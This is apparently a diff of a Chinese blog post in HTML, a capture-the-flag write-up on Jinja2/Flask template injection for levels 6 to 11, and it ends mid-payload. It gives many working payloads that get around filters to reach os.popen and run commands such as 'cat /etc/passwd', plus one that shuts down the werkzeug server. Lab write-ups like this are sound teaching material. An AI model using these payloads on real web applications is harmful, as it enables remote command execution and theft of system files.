 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">fruits = [<span class="hljs-string">&#x27;apple&#x27;</span>, <span class="hljs-string">&#x27;banana&#x27;</span>, <span class="hljs-string">&#x27;orange&#x27;</span>]<br><span class="hljs-keyword">for</span> index, fruit <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(fruits):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Index <span class="hljs-subst">&#123;index&#125;</span>: <span class="hljs-subst">&#123;fruit&#125;</span>&quot;</span>)<br>    <br><span class="hljs-comment">#output:Index 0: apple</span><br><span class="hljs-comment">#Index 1: banana</span><br><span class="hljs-comment">#Index 2: orange</span><br></code></pre></td></tr></table></figure>
 
 <h3 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h3><p>下划线被过滤了，受上一题的启发，试试request，诶嘿，可行，这里不要用点来取值，用中括号，用点的话逻辑关系全乱了</p>
-<p><img src="/2023/02/09/ssti/image-20230801042557864.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/ssti/image-20230801042557864.png"></p>
 <p>好玩</p>
-<p><img src="/2023/02/09/ssti/image-20230801042414133.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/ssti/image-20230801042414133.png"></p>
 <p>去网上看了看，还有别的绕过姿势，编码绕过</p>
 <p>十六进制编码绕过：</p>
 <p>对’_’hex编码，是5f，写作转义序列，\x5f</p>
-<p><img src="/2023/02/09/ssti/image-20230801171743303.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/ssti/image-20230801171743303.png"></p>
 <p>一个一个下划线转太麻烦，这里用python脚本</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">string = <span class="hljs-string">&quot;&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__().__getitem__(64).__init__.__globals__.__builtins__&#125;&#125;&quot;</span><br><br>string = string.replace(<span class="hljs-string">&#x27;_&#x27;</span>,(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;_&#x27;</span>))))<br>string = string.replace(<span class="hljs-string">&#x27;0x&#x27;</span>,<span class="hljs-string">&#x27;\\x&#x27;</span>)<br><br><span class="hljs-built_in">print</span>(string)<br><br><br><span class="hljs-comment">#output：&#123;&#123;&#x27;&#x27;.\x5f\x5fclass\x5f\x5f.\x5f\x5fbase\x5f\x5f.\x5f\x5fsubclasses\x5f\x5f().\x5f\x5fgetitem\x5f\x5f(64).\x5f\x5finit\x5f\x5f.\x5f\x5fglobals\x5f\x5f.\x5f\x5fbuiltins\x5f\x5f&#125;&#125;</span><br><span class="hljs-comment">#再手动把点换为[]，包裹住记的字符串得加引号，只用把名字括起来就行了，函数的小括号在中括号外：&#123;&#123;&#x27;&#x27;[&quot;\x5f\x5fclass\x5f\x5f&quot;][&quot;\x5f\x5fbase\x5f\x5f&quot;][&quot;\x5f\x5fsubclasses\x5f\x5f&quot;]()[&quot;\x5f\x5fgetitem\x5f\x5f&quot;](64)[&quot;\x5f\x5finit\x5f\x5f&quot;][&quot;\x5f\x5fglobals\x5f\x5f&quot;][&quot;\x5f\x5fbuiltins\x5f\x5f&quot;]&#125;&#125;</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="/2023/02/09/ssti/image-20230801174345081.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/ssti/image-20230801174345081.png"></p>
 <p>payload：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&#123;&#123;&#x27;&#x27;[&quot;\x5f\x5fclass\x5f\x5f&quot;][&quot;\x5f\x5fbase\x5f\x5f&quot;][&quot;\x5f\x5fsubclasses\x5f\x5f&quot;]()[&quot;\x5f\x5fgetitem\x5f\x5f&quot;](64)[&quot;\x5f\x5finit\x5f\x5f&quot;][&quot;\x5f\x5fglobals\x5f\x5f&quot;][&quot;\x5f\x5fbuiltins\x5f\x5f&quot;][&quot;\x5f\x5fimport\x5f\x5f&quot;](&#x27;os&#x27;).popen(&#x27;cat /etc/passwd&#x27;).read()&#125;&#125;<br></code></pre></td></tr></table></figure>
 
-<p><img src="/2023/02/09/ssti/image-20230801174537355.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/ssti/image-20230801174537355.png"></p>
 <p>ascii编码绕过：</p>
 <p>python中：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;num:state&#125;<br><span class="hljs-comment">#num表示格式化字符在参数列表中的索引，不填默认递增</span><br><span class="hljs-comment">#state表示格式说明符</span><br><span class="hljs-comment">#%s：字符串格式化。将变量作为字符串显示。</span><br><span class="hljs-comment">#%d：整数格式化。将变量作为十进制整数显示。</span><br><span class="hljs-comment">#%f：浮点数格式化。将变量作为浮点数显示。</span><br><span class="hljs-comment">#%x：十六进制格式化。将整数变量显示为小写十六进制数。</span><br><span class="hljs-comment">#%X：十六进制格式化。将整数变量显示为大写十六进制数。</span><br><span class="hljs-comment">#%o：八进制格式化。将整数变量显示为八进制数。</span><br><span class="hljs-comment">#%c：字符格式化。将整数变量显示为对应的 Unicode 字符。</span><br><span class="hljs-comment">#%r：原始数据格式化。使用 repr() 函数将变量转换为字符串显示。</span><br><br><span class="hljs-comment">#这里我们要利用的就是%c</span><br><br><span class="hljs-string">&quot;&#123;:c&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">65</span>)==<span class="hljs-string">&#x27;A&#x27;</span><br><span class="hljs-comment">#因此</span><br><br><span class="hljs-string">&quot;&#123;:c&#125;&#123;:c&#125;&#123;:c&#125;&#123;:c&#125;&#123;:c&#125;&#123;:c&#125;&#123;:c&#125;&#123;:c&#125;&#123;:c&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">95</span>,<span class="hljs-number">95</span>,<span class="hljs-number">99</span>,<span class="hljs-number">108</span>,<span class="hljs-number">97</span>,<span class="hljs-number">115</span>,<span class="hljs-number">115</span>,<span class="hljs-number">95</span>,<span class="hljs-number">95</span>)=<span class="hljs-string">&#x27;__class__&#x27;</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="/2023/02/09/ssti/image-20230801180249226.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/ssti/image-20230801180249226.png"></p>
 <p><code>format()</code>过滤器：(适用于中括号和点都被过滤)</p>
-<p><img src="/2023/02/09/ssti/image-20230802003013611.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/ssti/image-20230802003013611.png"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&#x27;%c%c%c%c%c%c%c%c%c&#x27;|format(95,95,99,108,97,115,115,95,95)==&#x27;__class__&#x27;<br></code></pre></td></tr></table></figure>
 
 <p><code>attr()</code>过滤器：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">code=&#123;&#123;&#x27;&#x27;|attr(&quot;&#123;:c&#125;&#123;:c&#125;&#123;:c&#125;&#123;:c&#125;&#123;:c&#125;&#123;:c&#125;&#123;:c&#125;&#123;:c&#125;&#123;:c&#125;&quot;.format(95,95,99,108,97,115,115,95,95))|attr(&quot;\x5f\x5fbase\x5f\x5f&quot;)|attr(&quot;\x5f\x5fsubclasses\x5f\x5f&quot;)()|attr(&quot;\x5f\x5fgetitem\x5f\x5f&quot;)(64)|attr(&quot;\x5f\x5finit\x5f\x5f&quot;)|attr(&quot;\x5f\x5fglobals\x5f\x5f&quot;)|attr(&quot;\x5f\x5fgetitem\x5f\x5f&quot;)(&quot;\x5f\x5fbuiltins\x5f\x5f&quot;)|attr(&quot;\x5f\x5fgetitem\x5f\x5f&quot;)(&quot;\x5f\x5fimport\x5f\x5f&quot;)(&#x27;os&#x27;)|attr(&#x27;popen&#x27;)(&#x27;cat /etc/passwd&#x27;)|attr(&#x27;read&#x27;)()&#125;&#125;<br><br>#取元素时一定要getitem，attr()过滤器用就要一用到底，不能与[],&#x27;.&#x27;等混用，也可unicode编码(\u005f)<br></code></pre></td></tr></table></figure>
 
-<p><img src="/2023/02/09/ssti/image-20230801222353241.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/ssti/image-20230801222353241.png"></p>
 <p>对于python2<code>attr()</code>内也可base64编码，但是我的题目环境是py3，所以无法实现</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&quot;__class__&quot;==(&quot;X19jbGFzc19f&quot;).decode(&quot;base64&quot;)<br></code></pre></td></tr></table></figure>
 
 <p>多种方式可以组合来：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">code=&#123;&#123;&#x27;&#x27;|attr(request.form.a)|attr(request.form.b)|attr(request.form.c)()|attr(request.form.d)(64)|attr(request.form.e)|attr(request.form.f)|attr(request.form.d)(request.form.g)|attr(request.form.d)(request.form.h)(request.form.i)&#125;&#125;&amp;a=__class__&amp;b=__base__&amp;c=__subclasses__&amp;d=__getitem__&amp;e=__init__&amp;f=__globals__&amp;g=__builtins__&amp;h=eval&amp;i=__import__(&#x27;os&#x27;).popen(&#x27;cat /etc/passwd&#x27;).read()<br></code></pre></td></tr></table></figure>
 
-<p><img src="/2023/02/09/ssti/image-20230801224316737.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/ssti/image-20230801224316737.png"></p>
 <h3 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h3><p>点被过滤，前面讲过了，用中括号绕过。几种方式组合一下</p>
 <p>payload：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">code=&#123;&#123;&#x27;&#x27;[&#x27;__class__&#x27;][&#x27;__base__&#x27;][&#x27;__subclasses__&#x27;]()[64][&#x27;__init__&#x27;][&#x27;__globals__&#x27;][&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;os&#x27;)[&#x27;popen&#x27;](request[&#x27;form&#x27;][&#x27;cmd&#x27;])[&#x27;read&#x27;]()&#125;&#125;&amp;cmd=cat /etc/passwd<br></code></pre></td></tr></table></figure>
 
-<p><img src="/2023/02/09/ssti/image-20230801235148461.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/ssti/image-20230801235148461.png"></p>
 <p>或者attr()过滤器，或者request对象绕过等等就不多说了</p>
-<p><img src="/2023/02/09/ssti/image-20230801235916098.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/ssti/image-20230801235916098.png"></p>
 <h3 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h3><p>字符串拼接绕过：</p>
 <p>payload：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">code=&#123;&#123;&#x27;&#x27;[&#x27;__clas&#x27;&#x27;s__&#x27;][&#x27;__bas&#x27;&#x27;e__&#x27;][&#x27;__subclas&#x27;&#x27;ses__&#x27;]()[64][&#x27;__ini&#x27;&#x27;t__&#x27;][&#x27;__globa&#x27;&#x27;ls__&#x27;][&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;os&#x27;)[&#x27;pop&#x27;&#x27;en&#x27;](&#x27;cat /etc/passwd&#x27;).read()&#125;&#125;<br></code></pre></td></tr></table></figure>
 
-<p><img src="/2023/02/09/ssti/image-20230802000940569.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/ssti/image-20230802000940569.png"></p>
 <p>拼接字符串也可以参考<code>join()</code>过滤器</p>
-<p><img src="/2023/02/09/ssti/image-20230802002124378.png" srcset="/img/loading.gif" lazyload></p>
-<p><img src="/2023/02/09/ssti/image-20230802002143318.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/ssti/image-20230802002124378.png"></p>
+<p><img src="/2023/02/09/ssti/image-20230802002143318.png"></p>
 <p>中括号被ban用<code>dict()</code>函数创建字典：<code>dict(__clas=1,s__=2)|join()</code></p>
 <p>jinja2中还支持’~’字符连接两个变量：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&#123;%set a=&#x27;__cla&#x27; %&#125;&#123;%set b=&#x27;ss__&#x27;%&#125;&#123;&#123;&quot;&quot;[a~b]&#125;&#125;<br></code></pre></td></tr></table></figure>
 
-<p><img src="/2023/02/09/ssti/image-20230802003435533.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/ssti/image-20230802003435533.png"></p>
 <p>或者字符串切片反转字符串：</p>
-<p><img src="/2023/02/09/ssti/image-20230802001152213.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/ssti/image-20230802001152213.png"></p>
 <p>反转字符串还可以使用<code>reverse()</code>过滤器绕实现</p>
-<p><img src="/2023/02/09/ssti/image-20230802002515106.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/ssti/image-20230802002515106.png"></p>
 <p><code>replace()</code>过滤器：</p>
-<p><img src="/2023/02/09/ssti/image-20230802002356262.png" srcset="/img/loading.gif" lazyload></p>
-<p><img src="/2023/02/09/ssti/image-20230802002419304.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/ssti/image-20230802002356262.png"></p>
+<p><img src="/2023/02/09/ssti/image-20230802002419304.png"></p>
 <p><code>string()</code>过滤器：将渲染在浏览器的部分转为一个字符串输出；</p>
-<p><code>select()</code>过滤器：<img src="/2023/02/09/ssti/image-20230802005306318.png" srcset="/img/loading.gif" lazyload></p>
+<p><code>select()</code>过滤器：<img src="/2023/02/09/ssti/image-20230802005306318.png"></p>
 <p>但是不知道为什么，放到浏览器后会是这样的：</p>
-<p><img src="/2023/02/09/ssti/image-20230802005341317.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/ssti/image-20230802005341317.png"></p>
 <p>但是结合上那个<code>string()</code>过滤器，有点东西</p>
 <p>能通过下标获取字符，</p>
-<p><img src="/2023/02/09/ssti/image-20230802005523502.png" srcset="/img/loading.gif" lazyload></p>
-<p>可以再简单点<img src="/2023/02/09/ssti/image-20230802005559881.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/ssti/image-20230802005523502.png"></p>
+<p>可以再简单点<img src="/2023/02/09/ssti/image-20230802005559881.png"></p>
 <p>拼个<code>__class__</code>看看，字符之间用~连接</p>
-<p><img src="/2023/02/09/ssti/image-20230802010231838.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/ssti/image-20230802010231838.png"></p>
 <p>假如说中括号被过滤了呢？怎么取下标，不慌，这里还有一个过滤器<code>list()</code>，能把字符串对象转化成列表对象输出：</p>
-<p><img src="/2023/02/09/ssti/image-20230802011023942.png" srcset="/img/loading.gif" lazyload></p>
-<p>这样一来就能用<code>pop()</code>方法输出字典内容了，当然用不用<code>list()</code>过滤器都能用<code>__getitem__</code><img src="/2023/02/09/ssti/image-20230802011047462.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/ssti/image-20230802011023942.png"></p>
+<p>这样一来就能用<code>pop()</code>方法输出字典内容了，当然用不用<code>list()</code>过滤器都能用<code>__getitem__</code><img src="/2023/02/09/ssti/image-20230802011047462.png"></p>
 <h3 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h3><p>数字被过滤了？</p>
 <p>不慌，有两个过滤器：</p>
 <p><code>length()</code>过滤器：</p>
-<p><img src="/2023/02/09/ssti/image-20230802013135950.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/ssti/image-20230802013135950.png"></p>
 <p><code>count()</code>过滤器：</p>
-<p><img src="/2023/02/09/ssti/image-20230802013210012.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/ssti/image-20230802013210012.png"></p>
 <p><code>index()</code>函数获取数字</p>
-<p><img src="/2023/02/09/ssti/image-20230802193034146.png" srcset="/img/loading.gif" lazyload></p>
-<p><img src="/2023/02/09/ssti/image-20230802193133736.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/ssti/image-20230802193034146.png"></p>
+<p><img src="/2023/02/09/ssti/image-20230802193133736.png"></p>
 <p>payload：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">code=&#123;&#123;&#x27;&#x27;[&#x27;__class__&#x27;][&#x27;__base__&#x27;][&#x27;__subclasses__&#x27;]()[&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;|count()][&#x27;__init__&#x27;][&#x27;__globals__&#x27;][&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;os&#x27;).popen(request.form.cmd).read()&#125;&#125;&amp;cmd=cat /etc/passwd<br></code></pre></td></tr></table></figure>
 
-<p><img src="/2023/02/09/ssti/image-20230802013559353.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/ssti/image-20230802013559353.png"></p>
 <p>搞定，学习别人的方法，可以直接通过循环寻找可利用类，不需要数字：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&#123;% for i in &#x27;&#x27;.__class__.__base__.__subclasses__() %&#125;&#123;% if i.__name__==&#x27;Popen&#x27; %&#125;&#123;&#123; i.__init__.__globals__.__getitem__(&#x27;os&#x27;).popen(&#x27;cat /etc/passwd&#x27;).read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;<br></code></pre></td></tr></table></figure>
 
 <p>实际情况中可以自行选择可利用类，万一popen就被ban了呢？</p>
 <h3 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h3><p>把config关掉了</p>
-<p><img src="/2023/02/09/ssti/image-20230802015231902.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/ssti/image-20230802015231902.png"></p>
 <p>学习怎么查看配置的时候发现了一个好玩的：</p>
 <p>在request对象中有一个叫做environ的对象，request.environ字典包含和服务器环境相关的对象，其中有一个’werkzeug.server.shutdown’&#x3D;&gt;shutdown_server()的方法，所以当我们注入<code>code=&#123;&#123;request.environ['werkzeug.server.shutdown']()&#125;&#125;</code>时</p>
-<p><img src="/2023/02/09/ssti/image-20230802020434847.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/ssti/image-20230802020434847.png"></p>
 <p>叮咚，程序停了</p>
-<p><img src="/2023/02/09/ssti/image-20230802020620149.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/ssti/image-20230802020620149.png"></p>
 <p>还发现某些情况下也可以不用那么麻烦地向前回溯到基类，再往下找可利用类和方法，一些内置的对象和函数</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">code=&#123;&#123;url_for.__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;cat /etc/passwd&#x27;).read()&#125;&#125;<br>code=&#123;&#123;get_flashed_messages.__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;cat /etc/passwd&#x27;).read()&#125;&#125;<br>code=&#123;&#123;request.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;open&#x27;](&#x27;/etc/passwd&#x27;).read()&#125;&#125;<br>code=&#123;&#123;url_for.__globals__.__builtins__.__import__(&#x27;os&#x27;).system(&#x27;ls&#x27;)&#125;&#125;<br></code></pre></td></tr></table></figure>
 
 <p>学会了不用<code>__globals__</code>的注入姿势：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">#warnings.catch_warnings类内部定义了_module=sys.modules[&#x27;warnings&#x27;]，而warnings模块含有__builtins__，如果可以找到warnings.catch_warnings类,则可以不使用__globals__<br><br>code=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[157]()._module.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;cat /etc/passwd&#x27;).read()&#125;&#125;<br></code></pre></td></tr></table></figure>
 
-<p><img src="/2023/02/09/ssti/image-20230802032116868.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/ssti/image-20230802032116868.png"></p>
 <p>还发现了过滤了class的话可以用dict直接跳过获取对象类的步骤：</p>
-<p><img src="/2023/02/09/ssti/image-20230802023425961.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/ssti/image-20230802023425961.png"></p>
 <p>最后总算找到了<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8029">一篇文章</a>，对于ssti的讲解还是比较到位的</p>
 <p>如果过滤了config，又需要查config：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&#123;&#123;get_flashed_messages.__globals__[&#x27;current_app&#x27;].config&#125;&#125;<br></code></pre></td></tr></table></figure>
 
-<p><img src="/2023/02/09/ssti/image-20230802030842185.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/ssti/image-20230802030842185.png"></p>
 <p>自己试了别的，发现url_for也可以，flask内置了这两个函数，</p>
-<h3 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h3><p><img src="/2023/02/09/ssti/image-20230802152241886.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h3><p><img src="/2023/02/09/ssti/image-20230802152241886.png"></p>
 <p>过滤了挺多东西的，点和中括号都被过滤了就得考虑<code>attr()</code>过滤器了，引号和request也被过滤了，那就拼字符，点被过滤所以chr的路暂时行不通(其实也不是不行就是很麻烦)，上面讲到过<code>select()</code>和<code>string()</code>还有<code>list()</code>过滤器</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&#123;&#123;1|select|string|list&#125;&#125;<br></code></pre></td></tr></table></figure>
 
-<p><img src="/2023/02/09/ssti/image-20230802135939015.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/ssti/image-20230802135939015.png"></p>
 <p>考虑到attr()过滤器里面包含的是字符串，那就先拼个pop出来：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&#123;%set pop=dict(pop=a)|join()%&#125;&#123;&#123;(1|select|string|list)|attr(pop)(0)&#125;&#125;<br></code></pre></td></tr></table></figure>
 
@@ -731,11 +359,11 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&#123;%set under=dict(_=a)|join()%&#125;<br>&#123;%set globals=under~under~dict(globals=a)|join()~under~under%&#125;<br>&#123;%set builtins=under~under~dict(builtins=a)|join()~under~under%&#125;<br>&#123;%set getitem=under~under~dict(getitem=a)|join()~under~under%&#125;<br>&#123;%set import=under~under~dict(import=a)|join()~under~under%&#125;<br>&#123;%set os=dict(os=a)|join()%&#125;<br>&#123;%set popen=dict(popen=a)|join()%&#125;<br>&#123;%set read=dict(read=a)|join()%&#125;<br>&#123;%set cmd=dict(ls=a)|join()%&#125;<br>&#123;&#123;url_for|attr(globals)|attr(getitem)(builtins)|attr(getitem)(import)(os)|attr(getitem)(popen)(cmd)|attr(read)()&#125;&#125;<br></code></pre></td></tr></table></figure>
 
 <p>可以看到已经成功导入os模块了！</p>
-<p><img src="/2023/02/09/ssti/image-20230802142259287.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/ssti/image-20230802142259287.png"></p>
 <p>payload：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&#123;%set under=dict(_=a)|join()%&#125;<br>&#123;%set globals=under~under~dict(globals=a)|join()~under~under%&#125;<br>&#123;%set builtins=under~under~dict(builtins=a)|join()~under~under%&#125;<br>&#123;%set getitem=under~under~dict(getitem=a)|join()~under~under%&#125;<br>&#123;%set import=under~under~dict(import=a)|join()~under~under%&#125;<br>&#123;%set os=dict(os=a)|join()%&#125;<br>&#123;%set popen=dict(popen=a)|join()%&#125;<br>&#123;%set cmd=dict(env=a)|join()%&#125;<br>&#123;%set read=dict(read=a)|join()%&#125;<br>&#123;&#123;url_for|attr(globals)|attr(getitem)(builtins)|attr(getitem)(import)(os)|attr(popen)(cmd)|attr(read)()&#125;&#125;<br></code></pre></td></tr></table></figure>
 
-<p><img src="/2023/02/09/ssti/image-20230802145108337.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/ssti/image-20230802145108337.png"></p>
 <p>emmm，停，有点问题，空格咋办，执行命令时难免会碰到空格的吧，当我试着用上面类似的方法构造空格时我失败了</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&#123;%set space=dict( =a)|join()%&#125;#这种方法不行<br></code></pre></td></tr></table></figure>
 
@@ -751,368 +379,68 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&#123;%set under=dict(_=a)|join()%&#125;<br>&#123;%set globals=under~under~dict(globals=a)|join()~under~under%&#125;<br>&#123;%set builtins=under~under~dict(builtins=a)|join()~under~under%&#125;<br>&#123;%set getitem=under~under~dict(getitem=a)|join()~under~under%&#125;<br>&#123;%set import=under~under~dict(import=a)|join()~under~under%&#125;<br>&#123;%set os=dict(os=a)|join()%&#125;<br>&#123;%set popen=dict(popen=a)|join()%&#125;<br>&#123;%set read=dict(read=a)|join()%&#125;<br>&#123;%set req=dict(reques=a,t=b)|join()%&#125;<br>&#123;%set form=dict(form=a)|join()%&#125;<br>&#123;%set cmd=dict(cmd=a)|join()%&#125;<br>&#123;&#123;url_for|attr(globals)|attr(getitem)(builtins)|attr(getitem)(import)(os)|attr(popen)((req|attr(form)|attr(cmd)))|attr(read)()&#125;&#125;&amp;cmd=ls<br></code></pre></td></tr></table></figure>
 
 <p>啥啥啥，又踩一个坑，<strong>这样传进去的是”request”字符串而根本不是request对象啊</strong>，那就去找request对象，运气不错，很快就找到了：</p>
-<p><img src="/2023/02/09/ssti/image-20230802150900349.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2023/02/09/ssti/image-20230802150900349.png"></p>
 <p>重新构造，虽然内置request，也就是说可通过<code>&#123;&#123;request&#125;&#125;</code>访问，但是注意这里构造的”request”依旧是字符串;</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&#123;%set under=dict(_=a)|join()%&#125;<br>&#123;%set globals=under~under~dict(globals=a)|join()~under~under%&#125;<br>&#123;%set builtins=under~under~dict(builtins=a)|join()~under~under%&#125;<br>&#123;%set getitem=under~under~dict(getitem=a)|join()~under~under%&#125;<br>&#123;%set import=under~under~dict(import=a)|join()~under~under%&#125;<br>&#123;%set os=dict(os=a)|join()%&#125;<br>&#123;%set popen=dict(popen=a)|join()%&#125;<br>&#123;%set 